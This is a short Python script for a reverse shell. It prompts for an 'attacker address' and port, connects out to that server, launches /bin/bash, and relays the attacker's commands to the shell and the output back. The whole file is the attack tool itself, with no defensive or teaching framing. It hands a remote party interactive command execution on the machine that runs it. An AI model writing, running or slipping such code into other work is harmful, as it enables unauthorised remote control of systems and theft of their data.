import socket
import subprocess

#Setting the IPV4/TCP connection
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Getting args to respective user connection
address = input("Type the attacker address\n")
port = int(input("Type the enabled port\n"))

#Connect to the attacker server
client.connect((address, port))

#Execute bin/bash after the connection
try:

	client.send(b"Connection established.")

	#Starts the interactive shell
	proc = subprocess.Popen(['/bin/bash'],
				stdin=subprocess.PIPE,
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				shell=True)

	while True:
		#Receive commands from atacker server
		command = client.recv(1024)

		if command.strip() == b"exit":
			break

		#Sends the command to bash
		proc.stdin.write(command + b"\n")
		proc.stdin.flush()

		#Capture then sends the output or error from the command
		output = proc.stdout.read() + proc.stderr.read()
		client.send(output)
finally:

	client.close()
